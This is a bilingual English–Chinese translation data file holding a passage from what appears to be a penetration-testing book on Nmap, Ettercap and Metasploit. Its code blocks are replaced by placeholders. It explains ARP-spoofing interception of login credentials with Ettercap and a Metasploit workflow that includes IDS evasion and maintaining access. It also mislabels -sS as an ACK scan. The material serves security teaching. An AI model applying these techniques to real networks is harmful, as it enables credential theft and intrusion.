    work with it efficiently.
  id: totrans-106
  prefs: []
  type: TYPE_NORMAL
  zh: GUI Zenmap 是熟悉 Nmap 的一个好方法，但如果你打算高效地使用 Nmap，最好还是学会如何在控制台中使用命令行参数。
- en: 'The Nmap command line has the following syntax:'
  id: totrans-107
  prefs: []
  type: TYPE_NORMAL
  zh: Nmap 命令行的语法如下：
- en: '`nmap [Scan Type(s)] [Options] {target specification}`'
  id: totrans-108
  prefs: []
  type: TYPE_NORMAL
  zh: '`nmap [扫描类型] [选项] {目标规格}`'
- en: 'The definitions for the terms are as follows:'
  id: totrans-109
  prefs: []
  type: TYPE_NORMAL
  zh: 术语的定义如下：
- en: '`Scan Type`: This is a technique of scanning. It can be a simple ping scan
    (`-sn`), TCP ACK scan (`-sS`), UDP scan (`-sU`), exotic Xmas scan (`-sX`), or
    TCP Null scan (`-sN`) for trying firewall bypass. Nmap is not limited to these
    techniques and there are others as well. You can get the full list by executing
    Nmap help:'
  id: totrans-110
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`扫描类型`：这是一种扫描技术。它可以是简单的 ping 扫描（`-sn`）、TCP ACK 扫描（`-sS`）、UDP 扫描（`-sU`）、特殊的
    Xmas 扫描（`-sX`）或 TCP Null 扫描（`-sN`），用于尝试绕过防火墙。Nmap 不仅限于这些技术，还有其他方法。你可以通过执行 Nmap
    帮助命令获取完整的列表：'
- en: '[PRE11]'
  id: totrans-111
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE11]'
- en: '`Options`: This is a set of scan parameters. The full description of Nmap options
    is more than 100 pages long. Thus, we are providing only a few examples here:'
  id: totrans-112
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`选项`：这是一组扫描参数。Nmap 选项的完整描述超过 100 页。因此，我们这里只提供几个示例：'
- en: The ports to scan (`-p`)
  id: totrans-113
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: 扫描的端口（`-p`）
- en: Probe open ports to determine service/version info (`-sV`)
  id: totrans-114
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: 探测开放端口以确定服务/版本信息（`-sV`）
- en: Resolve DNS name of target hosts or not
  id: totrans-115
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: 是否解析目标主机的 DNS 名称
- en: Enable OS detection (`-O`)
  id: totrans-116
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: 启用操作系统检测（`-O`）
- en: Firewall/IDS evasion and spoofing techniques
  id: totrans-117
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: 防火墙/IDS 绕过和欺骗技术
- en: 'Output parameters (Nmap has three basic output formats: Normal, XML, and Grepable
    format; this gives greater freedom in processing of the results)'
  id: totrans-118
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: 输出参数（Nmap有三种基本输出格式：普通、XML和可抓取格式；这提供了更大的结果处理自由度）
- en: '`target specification`: This is the parameter where we set our targets. The
    user can set the target address by typing it as a parameter of an execution command
    or as a file (using the option `-iL`), where each line is a host address.'
  id: totrans-119
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`target specification`：这是我们设置目标的参数。用户可以通过将目标地址作为执行命令的参数或作为文件（使用选项`-iL`）来设置目标地址，其中每一行是一个主机地址。'
- en: Most of the options can be combined with each other. Some options are for selecting
    a scan method, while others point to the use of additional features or are used
    to adjust various settings for scanning. Nmap warns the user about an invalid
    combination of options. As mentioned earlier, for a brief overview of all options,
    you should run Nmap with the `-h` parameter.
  id: totrans-120
  prefs: []
  type: TYPE_NORMAL
  zh: 大多数选项可以彼此结合使用。有些选项用于选择扫描方法，而其他选项则用于使用额外的功能或调整扫描的各种设置。Nmap会警告用户关于选项组合无效的情况。如前所述，要快速概览所有选项，您应当使用`-h`参数运行Nmap。
- en: 'For the detailed list of options, you can refer to the home page of Nmap ([https://nmap.org/book/man-briefoptions.html](https://nmap.org/book/man-briefoptions.html))
    or use the `man` command on Linux:'
  id: totrans-121
  prefs: []
  type: TYPE_NORMAL
  zh: 关于选项的详细列表，您可以参考Nmap的主页([https://nmap.org/book/man-briefoptions.html](https://nmap.org/book/man-briefoptions.html))，或在Linux上使用`man`命令：
- en: '[PRE12]'
  id: totrans-122
  prefs: []
  type: TYPE_PRE
  zh: '[PRE12]'
- en: Nmap is a very powerful tool that provides a lot of information such as the
    operating system running on the target host, open ports, MAC address of the device,
    and so on depending on the scan options and the target itself.
  id: totrans-123
  prefs: []
  type: TYPE_NORMAL
  zh: Nmap是一个非常强大的工具，可以提供大量信息，如目标主机上运行的操作系统、开放端口、设备的MAC地址等，具体取决于扫描选项和目标本身。
- en: Scripting engine
  id: totrans-124
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 脚本引擎
- en: At the completion of the review of this great software, we will consider why
    many experts call Nmap a Swiss army knife. **Nmap Scripting Engine** (**NSE**)
    is a result of the decision to empower Nmap by writing additional functionality
    in the language LUA.
  id: totrans-125
  prefs: []
  type: TYPE_NORMAL
  zh: 在完成对这个伟大软件的回顾后，我们将探讨为什么许多专家称Nmap为瑞士军刀。**Nmap脚本引擎**（**NSE**）是通过使用LUA语言编写附加功能来增强Nmap的决策结果。
- en: To use the scripts, it needs to use the `--script` key with the name of the
    script as a parameter `(--script=<script name>`).
  id: totrans-126
  prefs: []
  type: TYPE_NORMAL
  zh: 要使用脚本，需要使用`--script`键，并将脚本名称作为参数`(--script=<script name>)`。
- en: 'Currently, there is a huge variety of readymade scripts included in the Nmap
    distribution package, which can be used for the following purposes:'
  id: totrans-127
  prefs: []
  type: TYPE_NORMAL
  zh: 目前，Nmap分发包中包含了种类繁多的现成脚本，可用于以下目的：
- en: Information gathering
  id: totrans-128
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 信息收集
- en: Deep hosts and network services discovery
  id: totrans-129
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 深入的主机和网络服务发现
- en: Authentication processes checks
  id: totrans-130
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 身份验证过程检查
- en: Bruteforce attacks such as password guessing
  id: totrans-131
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 暴力攻击，如密码猜测
- en: DoS attacks
  id: totrans-132
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: DoS攻击
- en: Vulnerability identification
  id: totrans-133
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 漏洞识别
- en: Exploitation of vulnerabilities
  id: totrans-134
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 漏洞利用
- en: The full list of the available scripts and descriptions can be found at [http://nmap.org/nsedoc](http://nmap.org/nsedoc).
  id: totrans-135
  prefs: []
  type: TYPE_NORMAL
  zh: 可用脚本和描述的完整列表可以在[http://nmap.org/nsedoc](http://nmap.org/nsedoc)找到。
- en: If the functionality you need is not there in the standard package, you can
    write your own scripts to fit your needs.
  id: totrans-136
  prefs: []
  type: TYPE_NORMAL
  zh: 如果标准包中没有您所需的功能，您可以编写自己的脚本以满足您的需求。
- en: Example
  id: totrans-137
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 示例
- en: 'Now, we would like to show you the power of Nmap. For demonstration purposes,
    we are going to scan a Windows 7 machine in our user network segment. The machine
    has MS SQL Express and MS IIS7.5 servers installed, while its Windows Firewall
    is turned off. For this, we execute the following command:'
  id: totrans-138
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们想向您展示Nmap的强大功能。为了演示，我们将扫描用户网络段中的一台Windows 7机器。该机器安装了MS SQL Express和MS IIS7.5服务器，且其Windows防火墙已关闭。为此，我们执行以下命令：
- en: '[PRE13]'
  id: totrans-139
  prefs: []
  type: TYPE_PRE
  zh: '[PRE13]'
- en: 'Here, we use:'
  id: totrans-140
  prefs: []
  type: TYPE_NORMAL
  zh: 在这里，我们使用：
- en: '`-sS`: This is used for TCP Syn scan'
  id: totrans-141
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`-sS`：用于TCP Syn扫描'
- en: '`-sV`: This is used for determination of the network service version of open
    ports (this is a very "noisy" option)'
  id: totrans-142
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`-sV`：用于确定开放端口的网络服务版本（这是一个非常“嘈杂”的选项）'
- en: '`-O`: This is used for detecting the OS version'
  id: totrans-143
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`-O`：用于检测操作系统版本'
- en: '`-sC`: This is equivalent to `--script=default`, that is, all scripts of the
    **Default** category'
  id: totrans-144
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`-sC`：这等同于`--script=default`，即所有**默认**类别的脚本'
- en: '`-T4`: This is used for setting the fast timing template'
  id: totrans-145
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`-T4`：用于设置快速时间模板'
- en: '`172.16.0.102`: This is the IP address of our target'
  id: totrans-146
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`172.16.0.102`：这是我们目标的IP地址'
- en: 'After a couple of minutes, we will get the following result:'
  id: totrans-147
  prefs: []
  type: TYPE_NORMAL
  zh: 几分钟后，我们将得到以下结果：
- en: '![Example](../images/00058.jpeg)'
  id: totrans-148
  prefs: []
  type: TYPE_IMG
  zh: '![示例](../images/00058.jpeg)'
- en: As you can see, the output is sufficiently detailed and clear.
  id: totrans-149
  prefs: []
  type: TYPE_NORMAL
  zh: 正如你所见，输出结果足够详细且清晰。
- en: Note
  id: totrans-150
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: 'Nmap author *Gordon "Fyodor" Lyon* wrote the book *Nmap Network Scanning: The
    Official Nmap Project Guide to Network Discovery and Security Scanning*, *Nmap
    Project*. If you want to get the full power of Nmap, we strongly recommend that
    you read it. It is available on Amazon ([http://www.amazon.com/dp/0979958717?tag=secbks-20](http://www.amazon.com/dp/0979958717?tag=secbks-20)).'
  id: totrans-151
  prefs: []
  type: TYPE_NORMAL
  zh: Nmap 的作者 *戈登·"费奥多"·莱昂* 写了《*Nmap 网络扫描：Nmap 项目官方网络发现与安全扫描指南*》，*Nmap 项目*。如果你想充分发挥
    Nmap 的威力，我们强烈建议你阅读这本书。它在亚马逊上有售（[http://www.amazon.com/dp/0979958717?tag=secbks-20](http://www.amazon.com/dp/0979958717?tag=secbks-20)）。
- en: Ettercap
  id: totrans-152
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Ettercap
- en: In the course of hacking network infrastructure, **man-in-the-middle** (**MitM**)
    type attacks are often used. Such attacks are usually as easy to perform as they
    are easy to identify, because they are very "noisy" due to the large amount of
    auxiliary traffic they generate. But as a result, you can get a lot of useful
    information and get the possibility to manage a victim.
  id: totrans-153
  prefs: []
  type: TYPE_NORMAL
  zh: 在黑客攻击网络基础设施的过程中，**中间人**（**MitM**）类型的攻击经常被使用。这类攻击通常既容易执行，又容易被识别，因为它们由于生成大量的辅助流量而显得非常“嘈杂”。但因此，你可以获得大量有用的信息，并且能够控制受害者。
- en: There are a lot of tools for MitM attack execution. For operating systems of
    the Microsoft Windows family, the most popular ones are Cain ([http://www.oxid.it/cain.html](http://www.oxid.it/cain.html))
    and Intercepter-NG ([http://sniff.su/](http://sniff.su/)). They have a simple
    graphical user interface and rich features. The execution of the attack is reduced
    to a few mouse clicks. Another similar tool worth mentioning is a multiplatform
    tool Bettercap ([https://www.bettercap.org/](https://www.bettercap.org/)).
  id: totrans-154
  prefs: []
  type: TYPE_NORMAL
  zh: 有很多工具可以执行中间人攻击。对于 Microsoft Windows 家族的操作系统，最流行的工具是 Cain（[http://www.oxid.it/cain.html](http://www.oxid.it/cain.html)）和
    Intercepter-NG（[http://sniff.su/](http://sniff.su/)）。它们都有简单的图形用户界面和丰富的功能。执行攻击只需几次鼠标点击。另一个值得一提的类似工具是跨平台工具
    Bettercap（[https://www.bettercap.org/](https://www.bettercap.org/)）。
- en: As a classic and one of our favorite tools for performing MitM attacks (especially
    for ARP-spoofing), we are going to review Ettercap ([http://ettercap.github.io/ettercap/](http://ettercap.github.io/ettercap/)).
  id: totrans-155
  prefs: []
  type: TYPE_NORMAL
  zh: 作为一种经典的工具，也是我们最喜爱的中间人攻击（尤其是 ARP 欺骗）工具之一，我们将回顾 Ettercap（[http://ettercap.github.io/ettercap/](http://ettercap.github.io/ettercap/)）。
- en: Ettercap is a tool to analyze the security of the network, which has a wide
    variety of features, such as listening to network traffic, content filtering,
    and more for analysis of networks and hosts.
  id: totrans-156
  prefs: []
  type: TYPE_NORMAL
  zh: Ettercap 是一款用于分析网络安全的工具，具有各种功能，例如监听网络流量、内容过滤等，适用于网络和主机分析。
- en: 'Ettercap supports different protocols (Telnet, FTP, POP3, IMAP, SMB, HTTP,
    and many others) and can be used for:'
  id: totrans-157
  prefs: []
  type: TYPE_NORMAL
  zh: Ettercap 支持不同的协议（Telnet、FTP、POP3、IMAP、SMB、HTTP 等），可以用于：
- en: OS fingerprinting
  id: totrans-158
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 操作系统指纹识别
- en: Resetting network connections
  id: totrans-159
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 重置网络连接
- en: Filtering network traffic based on a set of parameters
  id: totrans-160
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 根据一组参数过滤网络流量
- en: Performing spoofing-attacks of various protocols, such as DNS
  id: totrans-161
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 执行各种协议的欺骗攻击，如 DNS
- en: The complete list of possibilities is much greater. Ettercap has many features
    and expands due to the large number of plugins.
  id: totrans-162
  prefs: []
  type: TYPE_NORMAL
  zh: 可能性的完整列表要大得多。Ettercap 拥有许多功能，并且由于大量插件的支持而不断扩展。
- en: In the result of the attack, obtained data can be viewed online (for example,
    if there were passwords in the network traffic, they would be shown immediately)
    and stored in a file.
  id: totrans-163
  prefs: []
  type: TYPE_NORMAL
  zh: 在攻击结果中，获取到的数据可以在线查看（例如，如果网络流量中有密码，它们会立即显示出来），也可以保存到文件中。
- en: The installation package of Ettercap is available on the official website ([https://ettercap.github.io/ettercap/downloads.html](https://ettercap.github.io/ettercap/downloads.html)),
    where you can download it.
  id: totrans-164
  prefs: []
  type: TYPE_NORMAL
  zh: Ettercap 的安装包可以在官方网站上找到（[https://ettercap.github.io/ettercap/downloads.html](https://ettercap.github.io/ettercap/downloads.html)），你可以在这里下载它。
- en: Ettercap is a Linux software, so it has a convenient console management with
    all the consequences. But it also has a graphical user interface. To run in graphical
    mode, you should execute Ettercap with the `-G` key.
  id: totrans-165
  prefs: []
  type: TYPE_NORMAL
  zh: Ettercap 是一款 Linux 软件，因此它提供了一个便捷的控制台管理界面，具备所有相关功能。但它也有图形用户界面。要在图形模式下运行，你需要使用`-G`键启动
    Ettercap。
- en: '![Ettercap](../images/00059.jpeg)'
  id: totrans-166
  prefs: []
  type: TYPE_IMG
  zh: '![Ettercap](../images/00059.jpeg)'
- en: So let's try Ettercap.
  id: totrans-167
  prefs: []
  type: TYPE_NORMAL
  zh: 所以，让我们来尝试一下 Ettercap。
- en: Exercise
  id: totrans-168
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 练习
- en: 'Now let''s try to start Ettercap in a couple of modes to see what it looks
    like:'
  id: totrans-169
  prefs: []
  type: TYPE_NORMAL
  zh: 现在让我们尝试在几种模式下启动 Ettercap，看看它是什么样子的：
- en: 'To start Ettercap in the sniffing mode, we should execute the Ettercap binary
    file specifying the network interface to work with (`-i eth0` or `-iface eth0`
    in our example) and one of the following keys to determine the type of user interface:'
  id: totrans-170
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 要启动 Ettercap 进入嗅探模式，我们应当执行 Ettercap 二进制文件，指定要使用的网络接口（在我们的例子中是 `-i eth0` 或 `-iface
    eth0`），以及以下其中一个选项来确定用户界面的类型：
- en: '`-T` (`--text`): This key uses text only GUI'
  id: totrans-171
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`-T` (`--text`)：此选项使用纯文本 GUI'
- en: '`-C` (`--curses`): This key uses curses GUI'
  id: totrans-172
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`-C` (`--curses`)：此选项使用 curses GUI'
- en: '`-D` (`--daemon`): This key daemonizes Ettercap (no GUI)'
  id: totrans-173
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`-D` (`--daemon`)：此选项将 Ettercap 守护进程化（无 GUI）'
- en: '`-G` (`--gtk`): This key uses GTK with GUI'
  id: totrans-174
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`-G` (`--gtk`)：此选项使用带 GUI 的 GTK'
- en: '[PRE14]'
  id: totrans-175
  prefs:
  - PREF_IND
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE14]'
- en: 'The following command starts Ettercap in a sniffer mode:'
  id: totrans-176
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 以下命令启动 Ettercap 进入嗅探模式：
- en: 'You should see an output similar to the following:'
  id: totrans-177
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 你应该看到类似以下的输出：
- en: '![Exercise](../images/00060.jpeg)'
  id: totrans-178
  prefs:
  - PREF_IND
  type: TYPE_IMG
  zh: '![练习](../images/00060.jpeg)'
- en: 'As you can see, Ettercap''s output is also very informative like Nmap''s output.
    Just press *q* when you want to stop Ettercap and it reports if it was terminated
    correctly:'
  id: totrans-179
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 正如你所见，Ettercap 的输出也像 Nmap 的输出一样具有很高的信息量。当你想要停止 Ettercap 时，只需按下 *q* 键，它会报告是否正确终止：
- en: '[PRE15]'
  id: totrans-180
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE15]'
- en: 'Ettercap has acquired its popularity for the opportunity to perform ARP-spoofing
    attacks. Let''s assume that we want to use Ettercap to intercept traffic (man-in-the-middle
    attack) between a workstation which connects to a web interface on another workstation.
    Here''s an example of using Ettercap to perform an ARP-spoofing MitM attack:'
  id: totrans-181
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: Ettercap 以执行 ARP 欺骗攻击而获得了其流行度。假设我们想要使用 Ettercap 拦截工作站与另一工作站上的 web 接口之间的流量（中间人攻击）。以下是使用
    Ettercap 执行 ARP 欺骗 MitM 攻击的示例：
- en: '[PRE16]'
  id: totrans-182
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE16]'
- en: 'Here:'
  id: totrans-183
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 'Here:'
- en: '`--text`: This is the text mode user interface'
  id: totrans-184
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`--text`：这是文本模式用户界面'
- en: '`--iface eth0`: This is the used network interface'
  id: totrans-185
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`--iface eth0`：这是使用的网络接口'
- en: '`--write traffic.pcap`: This is the dump of network traffic in PCAP file format
    (or you can use `-L log.txt` to log in Ettercap format)'
  id: totrans-186
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`--write traffic.pcap`：这是以 PCAP 文件格式存储的网络流量转储（或者你可以使用 `-L log.txt` 以 Ettercap
    格式记录）'
- en: '`--mitm arp:remote`: This is the MitM attack and its type'
  id: totrans-187
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`--mitm arp:remote`：这是 MitM 攻击及其类型'
- en: '`/172.16.0.91/ /172.16.0.102/`: Targets of the attack'
  id: totrans-188
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`/172.16.0.91/ /172.16.0.102/`：攻击的目标'
- en: 'We can see the intercepted HTTP traffic along with the login and password:'
  id: totrans-189
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 我们可以看到拦截的 HTTP 流量以及登录和密码：
- en: '![Exercise](../images/00061.jpeg)'
  id: totrans-190
  prefs:
  - PREF_IND
  type: TYPE_IMG
  zh: '![练习](../images/00061.jpeg)'
- en: Note
  id: totrans-191
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: 'If you want to learn more about Ettercap (and we believe you might, because
    it is a great tool) we recommend you, as always, read the official documentation
    and pay additional attention to the "etterfilters" functionality that significantly
    extends the power and abilities of Ettercap. You can get both descriptions of
    Ettercap and its etterfilters using the `man` commands:'
  id: totrans-192
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你想要了解更多关于 Ettercap 的信息（我们相信你可能会，因为它是一个很棒的工具），我们建议你像往常一样阅读官方文档，并额外关注“etterfilters”功能，它显著扩展了
    Ettercap 的功能和能力。你可以使用 `man` 命令获取 Ettercap 和它的 etterfilters 的描述：
- en: '[PRE17]'
  id: totrans-193
  prefs: []
  type: TYPE_PRE
  zh: '[PRE17]'
- en: Metasploit Framework
  id: totrans-194
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Metasploit Framework
- en: Metasploit is a great penetration testing tool that consists of hundreds of
    modules and exploits and allowing users to quickly write and integrate their own
    modules and extensions.
  id: totrans-195
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit 是一个出色的渗透测试工具，包含数百个模块和利用程序，允许用户快速编写和集成自己的模块和扩展。
- en: Through written code (mainly in Ruby), Metasploit is cross-platform, that is,
    it has no specific reference to any OS.
  id: totrans-196
  prefs: []
  type: TYPE_NORMAL
  zh: 通过编写的主要是 Ruby 的代码，Metasploit 是跨平台的，即它不针对任何特定的操作系统。
- en: Metasploit can be downloaded from the official website [http://www.metasploit.com](http://www.metasploit.com)
    and from the GitHub repository at [https://github.com/rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework).
  id: totrans-197
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit 可以从官方网站 [http://www.metasploit.com](http://www.metasploit.com) 和
    GitHub 仓库 [https://github.com/rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework)
    下载。
- en: 'You can download various versions of Metasploit:'
  id: totrans-198
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以下载各种版本的 Metasploit：
- en: '**Metasploit Framework**: This is for users of the Metasploit Framework command-line
    tools only'
  id: totrans-199
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Metasploit Framework**：这仅适用于 Metasploit Framework 命令行工具的用户'
- en: '**Metasploit Community**: This is a limited-feature, community edition for
    students and small businesses'
  id: totrans-200
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Metasploit Community**：这是面向学生和小型企业的功能有限的社区版'
- en: '**Metasploit Pro**: This is the commercial edition for penetration testers
    and security professionals'
  id: totrans-201
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Metasploit Pro**：这是面向渗透测试人员和安全专业人员的商业版'
- en: 'In our case, we will consider only the Framework version because it is fully
    functional and free. The functionality modules are divided into five categories:'
  id: totrans-202
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们的情况下，我们将仅考虑 Framework 版本，因为它功能完备且免费。功能模块分为五类：
- en: '**Auxiliary**: This category contains tools for performing support of exploitation
    processes. It contains discovery modules, information gathering modules, scanners,
    servers, and many more.'
  id: totrans-203
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**辅助**：这个类别包含用于支持利用过程的工具。它包含发现模块、信息收集模块、扫描器、服务器等。'
- en: '**Exploits**: This category contains modules for exploiting vulnerabilities.
    The exploits category divided on several platform subcategories, such as Windows,
    Linux, Solaris, OS X, and so on.'
  id: totrans-204
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**利用**：这个类别包含用于利用漏洞的模块。利用类别分为几个平台子类别，如Windows、Linux、Solaris、OS X等。'
- en: '**Payloads**: This category contains various types of payload, which can be
    used with exploits.'
  id: totrans-205
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**有效载荷**：这个类别包含各种类型的有效载荷，可以与利用一起使用。'
- en: '**Encoders**: This category contains tools to encode exploits and payloads
    to bypass security mechanisms of the target system.'
  id: totrans-206
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**编码器**：这个类别包含用于编码利用和有效载荷以绕过目标系统安全机制的工具。'
- en: '**Post**: This category contains post-exploitation tools, which can be used
    when network connection with a target host is established, such as escalation
    of privilege, information gathering on remote hosts, and others.'
  id: totrans-207
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**后期**：这个类别包含后期利用工具，当与目标主机建立网络连接时可以使用，比如权限提升、远程主机信息收集等。'
- en: 'Metasploit has several main user interfaces:'
  id: totrans-208
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit有几个主要的用户界面：
- en: Shell (`msfconsole`)
  id: totrans-209
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Shell（`msfconsole`）。
- en: Web interface (available in Community and Pro versions)
  id: totrans-210
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Web界面（在社区版和专业版中可用）。
- en: Third-party GUI (Armitage and more advanced Cobalt strike)
  id: totrans-211
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 第三方GUI（Armitage和更高级的Cobalt Strike）。
- en: 'But the basic functionality of the Framework is implemented via the following
    executable files:'
  id: totrans-212
  prefs: []
  type: TYPE_NORMAL
  zh: 但框架的基本功能是通过以下可执行文件实现的：
- en: '`msfrpc`: This is used for remote server implementation (based on remote procedure
    calling)'
  id: totrans-213
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msfrpc`: 用于远程服务器实现（基于远程过程调用）。'
- en: '`msfconsole`: This is the main utility for interaction with Metasploit via
    the console command line'
  id: totrans-214
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msfconsole`: 这是通过控制台命令行与Metasploit进行交互的主要实用程序。'
- en: '`msfd`: This utility allows spawning of an instance of msfconsole and allows
    remote users to connect to and use it'
  id: totrans-215
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msfd`: 这个实用程序允许生成msfconsole的一个实例，并允许远程用户连接并使用它。'
- en: '`msfupdate`: This is an update utility'
  id: totrans-216
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msfupdate`: 这是一个更新实用程序。'
- en: '`msfvenom`: This utility is used for creation of payloads'
  id: totrans-217
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msfvenom`: 该实用程序用于创建有效载荷。'
- en: The standard user interface is an interactive console command line, which can
    be run by executing the `msfconsole` command. In this interface, the user can
    feel the power of Metasploit.
  id: totrans-218
  prefs: []
  type: TYPE_NORMAL
  zh: 标准用户界面是一个交互式控制台命令行，可以通过执行`msfconsole`命令来运行。在这个界面中，用户可以感受到Metasploit的强大。
- en: 'Working with the Metasploit Framework consists of the following key steps:'
  id: totrans-219
  prefs: []
  type: TYPE_NORMAL
  zh: 使用Metasploit框架的工作包括以下关键步骤：
- en: Information gathering and vulnerability conditions identification (auxiliary
    modules).
  id: totrans-220
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 信息收集和漏洞条件识别（辅助模块）。
- en: Selecting and configuring an exploit for remote target object.
  id: totrans-221
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 选择和配置用于远程目标对象的利用。
- en: Selecting and configuring the payload that will be used.
  id: totrans-222
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 选择和配置将要使用的有效载荷。
- en: Selecting and configuring the encoding that will be used to bypass security
    mechanisms (such as Intrusion Detection System).
  id: totrans-223
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 选择和配置将用于绕过安全机制（如入侵检测系统）的编码。
- en: Exploiting remote systems.
  id: totrans-224
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 利用远程系统。
- en: Maintaining access.
  id: totrans-225
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 保持访问。
- en: Post-exploitation actions (post modules).
  id: totrans-226
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 后期利用操作（后期模块）。
- en: Metasploit is easy to use. It was created with the purpose to assist and facilitate
    the work of penetration testing specialists.
  id: totrans-227
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit易于使用。它的创建目的是协助和简化渗透测试专家的工作。
- en: 'The following are the most popular commands:'
  id: totrans-228
  prefs: []
  type: TYPE_NORMAL
  zh: 以下是最受欢迎的命令：
- en: '`use`: This is used to select a module.'
  id: totrans-229
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`use`: 用于选择一个模块。'
- en: '`search`: This command is used for searching modules.'
  id: totrans-230
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`search`: 该命令用于搜索模块。'
- en: '`show options`: These are used to view the settings of the module to configure.
    After selecting an exploit, you can see what options are available for customization.'
  id: totrans-231
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`show options`: 用于查看模块配置的设置。选择一个利用后，您可以看到可用于自定义的选项。'
- en: '`show payloads`: Metasploit comprises a lot of payloads. This command shows
    all the available payloads. By using this command, you can also see the recommended
    payloads for a particular operating system or exploit.'
  id: totrans-232
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`show payloads`: Metasploit包含许多有效载荷。这个命令显示所有可用的有效载荷。通过使用这个命令，您还可以查看特定操作系统或利用的推荐有效载荷。'
- en: '`info`: This is used to view information about the module.'
  id: totrans-233
  prefs:
